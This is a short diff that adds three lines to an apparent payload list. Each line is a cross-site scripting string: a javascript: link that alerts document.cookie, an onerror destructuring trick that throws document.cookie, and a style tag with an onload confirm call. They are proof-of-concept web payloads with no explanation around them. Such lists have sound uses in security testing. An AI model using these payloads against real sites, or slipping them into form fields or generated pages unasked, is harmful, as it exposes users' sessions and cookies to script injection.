@@ -1,0 +1,3 @@
+JJXSS"><a href="javascript:alert(document.cookie);">xss</a>
+javascript:var{a:onerror}={a:alert};throw document.cookie
+payload"><style/onload=confirm(9999)>
